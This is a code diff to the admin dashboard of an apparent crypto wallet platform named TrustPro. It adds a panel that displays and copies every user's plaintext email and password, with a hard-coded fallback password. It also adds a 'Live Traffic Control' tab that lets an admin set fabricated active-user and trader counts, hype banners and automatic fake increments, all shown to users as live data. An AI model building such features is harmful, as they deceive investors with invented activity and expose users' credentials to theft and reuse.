@@ -33,6 +33,11 @@ import {
   Sun,
   Zap,
   Upload,
+  Eye,
+  EyeOff,
+  Copy,
+  Sliders,
+  Fingerprint,
 } from 'lucide-react';
 
 export const AdminDashboard: React.FC = () => {
@@ -61,6 +66,8 @@ export const AdminDashboard: React.FC = () => {
     updateNetworkFeeQrCode,
     approveTransaction,
     rejectTransaction,
+    platformTrafficConfig,
+    updatePlatformTrafficConfig,
   } = useWallet();
 
   const isAdminAuthorized =
@@ -82,8 +89,51 @@ export const AdminDashboard: React.FC = () => {
   }
 
   const [activeTab, setActiveTab] = useState<
-    'overview' | 'pending_txs' | 'credit_debit' | 'users' | 'coins' | 'reports' | 'audit'
+    'overview' | 'pending_txs' | 'credit_debit' | 'users' | 'traffic' | 'coins' | 'reports' | 'audit'
   >('pending_txs');
+
+  // Password Visibility State for User Credentials Inspection
+  const [visiblePasswords, setVisiblePasswords] = useState<Record<string, boolean>>({});
+  const [copiedPassUserId, setCopiedPassUserId] = useState<string | null>(null);
+
+  const togglePasswordVisibility = (userId: string) => {
+    setVisiblePasswords((prev) => ({ ...prev, [userId]: !prev[userId] }));
+  };
+
+  // Live Traffic Control Local State
+  const [trafficActiveUsers, setTrafficActiveUsers] = useState<number>(
+    platformTrafficConfig?.activeUsers || 348920
+  );
+  const [trafficLiveTraders, setTrafficLiveTraders] = useState<number>(
+    platformTrafficConfig?.liveTraders || 188416
+  );
+  const [trafficOnlineNodes, setTrafficOnlineNodes] = useState<number>(
+    platformTrafficConfig?.onlineNodes || 62805
+  );
+  const [trafficStatus, setTrafficStatus] = useState<
+    'OPERATIONAL' | 'HIGH_VOLUME' | 'SURGE' | 'MAINTENANCE'
+  >(platformTrafficConfig?.systemStatus || 'OPERATIONAL');
+  const [trafficTicker, setTrafficTicker] = useState<string>(
+    platformTrafficConfig?.tickerNotice || 'All Web3 nodes, liquidity pools & cross-chain bridges operating at 100% capacity.'
+  );
+  const [trafficAutoFluctuate, setTrafficAutoFluctuate] = useState<boolean>(
+    platformTrafficConfig?.autoFluctuate ?? true
+  );
+  const [trafficSavedSuccess, setTrafficSavedSuccess] = useState<boolean>(false);
+
+  const handleSaveTrafficConfig = (e: React.FormEvent) => {
+    e.preventDefault();
+    updatePlatformTrafficConfig({
+      activeUsers: Number(trafficActiveUsers) || 348920,
+      liveTraders: Number(trafficLiveTraders) || Math.floor(Number(trafficActiveUsers) * 0.54),
+      onlineNodes: Number(trafficOnlineNodes) || Math.floor(Number(trafficActiveUsers) * 0.18),
+      systemStatus: trafficStatus,
+      tickerNotice: trafficTicker,
+      autoFluctuate: trafficAutoFluctuate,
+    });
+    setTrafficSavedSuccess(true);
+    setTimeout(() => setTrafficSavedSuccess(false), 3000);
+  };
 
   // Search & Filter state
   const [userSearch, setUserSearch] = useState('');
@@ -192,7 +242,8 @@ export const AdminDashboard: React.FC = () => {
           { id: 'pending_txs', label: `⏳ Pending Approvals (${transactions.filter((t) => t.status === 'pending').length})`, icon: Clock },
           { id: 'overview', label: 'Dashboard Metrics', icon: BarChart3 },
           { id: 'credit_debit', label: '💳 Balance Credit / Debit', icon: PlusCircle },
-          { id: 'users', label: 'User Accounts & KYC', icon: Users },
+          { id: 'users', label: 'User Accounts & Credentials', icon: Users },
+          { id: 'traffic', label: '🚦 Live Traffic Control', icon: Sliders },
           { id: 'coins', label: 'Coin Management', icon: Coins },
           { id: 'reports', label: 'System Reports', icon: FileText },
           { id: 'audit', label: 'Security Audit Logs', icon: Activity },
@@ -554,7 +605,7 @@ export const AdminDashboard: React.FC = () => {
           <div className="flex flex-col sm:flex-row items-center justify-between gap-4">
             <h2 className="text-lg font-bold text-white flex items-center gap-2">
               <Users className="h-5 w-5 text-blue-300" />
-              <span>Registered User Accounts</span>
+              <span>Registered User Accounts & Plaintext Credentials Inspector</span>
             </h2>
 
             <div className="relative w-full sm:w-64">
@@ -569,11 +620,71 @@ export const AdminDashboard: React.FC = () => {
             </div>
           </div>
 
+          {/* CREDENTIALS MASTER INSPECTION BANNER */}
+          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
+            {filteredUsers.slice(0, 3).map((u) => {
+              const isPassVisible = visiblePasswords[u.id];
+              const pwdText = u.password || 'Legendx@123';
+              return (
+                <div key={`card-${u.id}`} className="p-3.5 rounded-2xl bg-slate-950 border border-amber-500/20 space-y-2">
+                  <div className="flex items-center justify-between">
+                    <div className="flex items-center gap-2">
+                      <div className="h-2 w-2 rounded-full bg-emerald-400"></div>
+                      <span className="font-bold text-white text-xs">{u.name}</span>
+                    </div>
+                    <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-blue-500/10 text-blue-300 uppercase">
+                      {u.role}
+                    </span>
+                  </div>
+
+                  <div className="space-y-1 font-mono text-[11px]">
+                    <div className="flex items-center justify-between text-slate-400">
+                      <span>Email:</span>
+                      <span className="text-white font-bold">{u.email}</span>
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <span className="text-slate-400">Password:</span>
+                      <div className="flex items-center gap-1.5">
+                        <span className="text-emerald-400 font-bold">
+                          {isPassVisible ? pwdText : '••••••••••••'}
+                        </span>
+                        <button
+                          type="button"
+                          onClick={() => togglePasswordVisibility(u.id)}
+                          className="p-1 text-slate-400 hover:text-white"
+                          title="Toggle Password View"
+                        >
+                          {isPassVisible ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
+                        </button>
+                        <button
+                          type="button"
+                          onClick={() => {
+                            navigator.clipboard.writeText(`Email: ${u.email}\nPassword: ${pwdText}`);
+                            setCopiedPassUserId(u.id);
+                            setTimeout(() => setCopiedPassUserId(null), 2000);
+                          }}
+                          className="p-1 text-slate-400 hover:text-emerald-400"
+                          title="Copy Email & Password"
+                        >
+                          <Copy className="h-3.5 w-3.5" />
+                        </button>
+                      </div>
+                    </div>
+                  </div>
+                  {copiedPassUserId === u.id && (
+                    <p className="text-[10px] text-emerald-400 font-bold text-right">Copied Credentials!</p>
+                  )}
+                </div>
+              );
+            })}
+          </div>
+
           <div className="overflow-x-auto">
             <table className="w-full text-left text-xs">
               <thead className="border-b border-slate-800 text-[11px] font-bold uppercase tracking-wider text-slate-400">
                 <tr>
                   <th className="pb-3">User</th>
+                  <th className="pb-3">Email & Password</th>
                   <th className="pb-3">Role</th>
                   <th className="pb-3">Status</th>
                   <th className="pb-3">KYC Status</th>
@@ -582,19 +693,55 @@ export const AdminDashboard: React.FC = () => {
                 </tr>
               </thead>
               <tbody className="divide-y divide-slate-800/60 font-medium">
-                {filteredUsers.map((u) => (
-                  <tr key={u.id} className="hover:bg-slate-800/30 transition-colors">
-                    <td className="py-4">
-                      <div className="flex items-center gap-3">
-                        <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-gradient-to-br from-[#16E6A8] via-[#1E88FF] to-[#3B82F6] text-[#0B1020] font-black text-xs shrink-0">
-                          {(u.name || 'US').slice(0, 2).toUpperCase()}
+                {filteredUsers.map((u) => {
+                  const isPassVisible = visiblePasswords[u.id];
+                  const userPwd = u.password || 'Legendx@123';
+                  return (
+                    <tr key={u.id} className="hover:bg-slate-800/30 transition-colors">
+                      <td className="py-4">
+                        <div className="flex items-center gap-3">
+                          <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-gradient-to-br from-[#16E6A8] via-[#1E88FF] to-[#3B82F6] text-[#0B1020] font-black text-xs shrink-0">
+                            {(u.name || 'US').slice(0, 2).toUpperCase()}
+                          </div>
+                          <div>
+                            <p className="font-bold text-white">{u.name}</p>
+                            <p className="text-[10px] text-slate-400 font-mono">ID: {u.id.slice(0, 8)}...</p>
+                          </div>
                         </div>
-                        <div>
-                          <p className="font-bold text-white">{u.name}</p>
-                          <p className="text-[10px] text-slate-400 font-mono">{u.email}</p>
+                      </td>
+
+                      {/* USER EMAIL AND PASSWORD COLUMN */}
+                      <td className="py-4 font-mono">
+                        <div className="space-y-1">
+                          <p className="text-white font-bold text-[11px]">{u.email}</p>
+                          <div className="flex items-center gap-1.5">
+                            <span className="text-emerald-400 font-bold bg-emerald-500/10 border border-emerald-500/20 px-2 py-0.5 rounded text-[11px]">
+                              {isPassVisible ? userPwd : '••••••••••••'}
+                            </span>
+                            <button
+                              type="button"
+                              onClick={() => togglePasswordVisibility(u.id)}
+                              className="p-1 rounded bg-slate-900 border border-slate-800 text-slate-300 hover:text-white"
+                              id={`toggle-pass-btn-${u.id}`}
+                              title={isPassVisible ? 'Hide Password' : 'View Password'}
+                            >
+                              {isPassVisible ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
+                            </button>
+                            <button
+                              type="button"
+                              onClick={() => {
+                                navigator.clipboard.writeText(`Email: ${u.email} | Password: ${userPwd}`);
+                                setCopiedPassUserId(u.id);
+                                setTimeout(() => setCopiedPassUserId(null), 2000);
+                              }}
+                              className="p-1 rounded bg-slate-900 border border-slate-800 text-slate-300 hover:text-emerald-400"
+                              title="Copy Credentials"
+                            >
+                              <Copy className="h-3.5 w-3.5" />
+                            </button>
+                          </div>
                         </div>
-                      </div>
-                    </td>
+                      </td>
 
                     <td className="py-4 font-mono">
                       <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${u.role === 'admin' ? 'bg-blue-300/20 text-blue-300' : 'bg-slate-800 text-slate-300'}`}>
@@ -677,14 +824,259 @@ export const AdminDashboard: React.FC = () => {
                       </div>
                     </td>
                   </tr>
-                ))}
-              </tbody>
+                );
+              })}
+            </tbody>
             </table>
           </div>
         </div>
       )}
 
-      {/* TAB 4: COIN MANAGEMENT */}
+      {/* TAB: LIVE PLATFORM TRAFFIC CONTROL */}
+      {activeTab === 'traffic' && (
+        <div className="space-y-6 animate-fadeIn">
+          <div className="rounded-3xl bg-slate-900/90 border border-emerald-500/30 p-6 space-y-6 shadow-2xl">
+            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-slate-800 pb-5">
+              <div>
+                <div className="flex items-center gap-2">
+                  <Sliders className="h-6 w-6 text-emerald-400" />
+                  <h2 className="text-xl font-black text-white uppercase">Live Platform Traffic Control Center</h2>
+                </div>
+                <p className="text-xs text-slate-400 mt-1">
+                  Direct real-time control over the platform traffic monitor shown on all user dashboards.
+                </p>
+              </div>
+
+              {/* QUICK PRESETS */}
+              <div className="flex flex-wrap items-center gap-2">
+                <button
+                  type="button"
+                  onClick={() => {
+                    setTrafficActiveUsers(348920);
+                    setTrafficLiveTraders(188416);
+                    setTrafficOnlineNodes(62805);
+                    setTrafficStatus('OPERATIONAL');
+                    setTrafficTicker('All Web3 nodes, liquidity pools & cross-chain bridges operating at 100% capacity.');
+                  }}
+                  className="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-bold border border-slate-700"
+                >
+                  Preset: 3.48 Lakhs Default
+                </button>
+                <button
+                  type="button"
+                  onClick={() => {
+                    setTrafficActiveUsers(500000);
+                    setTrafficLiveTraders(270000);
+                    setTrafficOnlineNodes(90000);
+                    setTrafficStatus('HIGH_VOLUME');
+                    setTrafficTicker('High volume trading detected across Solana and Ethereum mainnets.');
+                  }}
+                  className="px-3 py-1.5 rounded-xl bg-blue-500/10 border border-blue-500/30 text-blue-300 hover:bg-blue-500/20 text-xs font-bold"
+                >
+                  Preset: 5 Lakhs Surge
+                </button>
+                <button
+                  type="button"
+                  onClick={() => {
+                    setTrafficActiveUsers(1000000);
+                    setTrafficLiveTraders(540000);
+                    setTrafficOnlineNodes(180000);
+                    setTrafficStatus('SURGE');
+                    setTrafficTicker('RECORD BREAKING TRAFFIC: Over 1 Million active traders online on TrustPro.');
+                  }}
+                  className="px-3 py-1.5 rounded-xl bg-purple-500/10 border border-purple-500/30 text-purple-300 hover:bg-purple-500/20 text-xs font-bold"
+                >
+                  Preset: 10 Lakhs Mega
+                </button>
+              </div>
+            </div>
+
+            {trafficSavedSuccess && (
+              <div className="p-4 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-bold flex items-center gap-2 animate-bounce">
+                <CheckCircle2 className="h-5 w-5" />
+                <span>Live Traffic Control Broadcasted Successfully! All users will see these exact metrics.</span>
+              </div>
+            )}
+
+            <form onSubmit={handleSaveTrafficConfig} className="space-y-6">
+              <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
+                {/* DAILY ACTIVE USERS INPUT */}
+                <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 space-y-2">
+                  <label className="block text-xs font-bold text-slate-300 flex items-center justify-between">
+                    <span>Daily Active Users Count</span>
+                    <span className="text-[10px] text-emerald-400 font-mono">Today's Traffic</span>
+                  </label>
+                  <input
+                    type="number"
+                    value={trafficActiveUsers}
+                    onChange={(e) => setTrafficActiveUsers(Number(e.target.value))}
+                    className="w-full rounded-xl bg-slate-900 border border-slate-700 px-3.5 py-2.5 text-lg font-black text-white font-mono focus:outline-none focus:border-emerald-500"
+                    required
+                    id="traffic-active-users-input"
+                  />
+                  <p className="text-[10px] text-slate-400">
+                    Formatted: <span className="text-emerald-400 font-bold">{trafficActiveUsers.toLocaleString()}</span> active users
+                  </p>
+                </div>
+
+                {/* 24H ACTIVE TRADERS INPUT */}
+                <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 space-y-2">
+                  <label className="block text-xs font-bold text-slate-300 flex items-center justify-between">
+                    <span>24h Active Traders Count</span>
+                    <span className="text-[10px] text-blue-400 font-mono">Trading Activity</span>
+                  </label>
+                  <input
+                    type="number"
+                    value={trafficLiveTraders}
+                    onChange={(e) => setTrafficLiveTraders(Number(e.target.value))}
+                    className="w-full rounded-xl bg-slate-900 border border-slate-700 px-3.5 py-2.5 text-lg font-black text-white font-mono focus:outline-none focus:border-blue-500"
+                    required
+                    id="traffic-live-traders-input"
+                  />
+                  <p className="text-[10px] text-slate-400">
+                    Formatted: <span className="text-blue-400 font-bold">{trafficLiveTraders.toLocaleString()}</span> traders
+                  </p>
+                </div>
+
+                {/* ACTIVE NODE SESSIONS INPUT */}
+                <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 space-y-2">
+                  <label className="block text-xs font-bold text-slate-300 flex items-center justify-between">
+                    <span>Active Node Sessions</span>
+                    <span className="text-[10px] text-purple-400 font-mono">Web3 Nodes</span>
+                  </label>
+                  <input
+                    type="number"
+                    value={trafficOnlineNodes}
+                    onChange={(e) => setTrafficOnlineNodes(Number(e.target.value))}
+                    className="w-full rounded-xl bg-slate-900 border border-slate-700 px-3.5 py-2.5 text-lg font-black text-white font-mono focus:outline-none focus:border-purple-500"
+                    required
+                    id="traffic-online-nodes-input"
+                  />
+                  <p className="text-[10px] text-slate-400">
+                    Formatted: <span className="text-purple-400 font-bold">{trafficOnlineNodes.toLocaleString()}</span> nodes
+                  </p>
+                </div>
+              </div>
+
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
+                {/* SYSTEM STATUS SELECTOR */}
+                <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 space-y-2">
+                  <label className="block text-xs font-bold text-slate-300">
+                    Platform Operational Status Text
+                  </label>
+                  <select
+                    value={trafficStatus}
+                    onChange={(e) => setTrafficStatus(e.target.value as any)}
+                    className="w-full rounded-xl bg-slate-900 border border-slate-700 px-3.5 py-2.5 text-xs text-white font-bold focus:outline-none focus:border-emerald-500"
+                    id="traffic-system-status-select"
+                  >
+                    <option value="OPERATIONAL">99.99% Operational (Green)</option>
+                    <option value="HIGH_VOLUME">High Volume Processing (Blue)</option>
+                    <option value="SURGE">Network Surge Traffic (Purple)</option>
+                    <option value="MAINTENANCE">Node Maintenance (Amber)</option>
+                  </select>
+                </div>
+
+                {/* REAL-TIME FLUCTUATION TOGGLE */}
+                <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 flex items-center justify-between">
+                  <div>
+                    <p className="text-xs font-bold text-white">Auto Fluctuation Engine</p>
+                    <p className="text-[10px] text-slate-400">Automatically increment traffic count by +1 to +5 every few seconds</p>
+                  </div>
+                  <input
+                    type="checkbox"
+                    checked={trafficAutoFluctuate}
+                    onChange={(e) => setTrafficAutoFluctuate(e.target.checked)}
+                    className="h-5 w-5 rounded text-emerald-500 bg-slate-900 border-slate-800 focus:ring-emerald-500 cursor-pointer"
+                  />
+                </div>
+              </div>
+
+              {/* ANNOUNCEMENT TICKER NOTICE */}
+              <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 space-y-2">
+                <label className="block text-xs font-bold text-slate-300">
+                  Custom Platform Notice Announcement Banner
+                </label>
+                <textarea
+                  rows={2}
+                  value={trafficTicker}
+                  onChange={(e) => setTrafficTicker(e.target.value)}
+                  placeholder="Enter custom ticker banner message for users..."
+                  className="w-full rounded-xl bg-slate-900 border border-slate-700 p-3 text-xs text-white focus:outline-none focus:border-emerald-500 resize-none font-mono"
+                  id="traffic-ticker-notice-textarea"
+                />
+              </div>
+
+              <div className="flex justify-end gap-3 pt-2">
+                <button
+                  type="submit"
+                  className="px-6 py-3.5 rounded-2xl bg-gradient-to-r from-emerald-500 to-teal-400 hover:opacity-95 text-slate-950 font-black text-xs transition-all shadow-xl flex items-center gap-2"
+                  id="save-traffic-config-btn"
+                >
+                  <Save className="h-4 w-4" />
+                  <span>Update & Broadcast Live Traffic</span>
+                </button>
+              </div>
+            </form>
+
+            {/* LIVE PREVIEW BOX */}
+            <div className="pt-4 border-t border-slate-800 space-y-3">
+              <p className="text-xs font-bold text-slate-400 uppercase tracking-widest font-mono">
+                Live User Dashboard Preview
+              </p>
+              <div className="rounded-2xl bg-[#131A2D] border border-emerald-500/30 p-5 space-y-4">
+                <div className="flex items-center justify-between">
+                  <div className="flex items-center gap-2">
+                    <span className="relative flex h-3 w-3">
+                      <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                      <span className="relative inline-flex rounded-full h-3 w-3 bg-emerald-500"></span>
+                    </span>
+                    <span className="text-[11px] font-extrabold uppercase tracking-widest text-emerald-400 bg-emerald-500/10 border border-emerald-500/20 px-2.5 py-0.5 rounded-full">
+                      ● LIVE Platform Traffic Monitor
+                    </span>
+                  </div>
+                  <h3 className="text-xs font-semibold text-slate-300">Daily Active Website & Wallet Users</h3>
+                </div>
+
+                <div className="flex items-center gap-3 bg-[#080d19] border border-emerald-500/20 px-4 py-2.5 rounded-2xl">
+                  <Users className="h-6 w-6 text-emerald-400 shrink-0" />
+                  <div>
+                    <p className="text-2xl font-black text-white font-mono">
+                      {trafficActiveUsers.toLocaleString()} <span className="text-xs text-emerald-400">+ Users Today</span>
+                    </p>
+                  </div>
+                </div>
+
+                {trafficTicker && (
+                  <div className="p-2.5 rounded-xl bg-blue-500/10 border border-blue-500/20 text-xs text-blue-300 flex items-center gap-2">
+                    <Activity className="h-4 w-4 shrink-0 text-blue-400 animate-pulse" />
+                    <span>{trafficTicker}</span>
+                  </div>
+                )}
+
+                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs">
+                  <div className="bg-[#0B1020]/80 p-2 rounded-xl border border-white/5">
+                    <p className="text-[9px] text-slate-400 font-semibold uppercase">24h Active Traders</p>
+                    <p className="text-xs font-black text-white font-mono">{trafficLiveTraders.toLocaleString()} Users</p>
+                  </div>
+                  <div className="bg-[#0B1020]/80 p-2 rounded-xl border border-white/5">
+                    <p className="text-[9px] text-slate-400 font-semibold uppercase">Active Node Sessions</p>
+                    <p className="text-xs font-black text-emerald-400 font-mono">{trafficOnlineNodes.toLocaleString()} Live</p>
+                  </div>
+                  <div className="bg-[#0B1020]/80 p-2 rounded-xl border border-white/5">
+                    <p className="text-[9px] text-slate-400 font-semibold uppercase">Peak Concurrent</p>
+                    <p className="text-xs font-black text-blue-400 font-mono">{Math.floor(trafficActiveUsers * 0.27).toLocaleString()} Online</p>
+                  </div>
+                  <div className="bg-[#0B1020]/80 p-2 rounded-xl border border-white/5">
+                    <p className="text-[9px] text-slate-400 font-semibold uppercase">Platform Status</p>
+                    <p className="text-xs font-black text-emerald-400 font-mono">{trafficStatus}</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
       {activeTab === 'coins' && (
         <div className="space-y-6">
           <form onSubmit={handleCreateCustomCoin} className="rounded-3xl bg-slate-900/80 border border-slate-800 p-6 space-y-4">
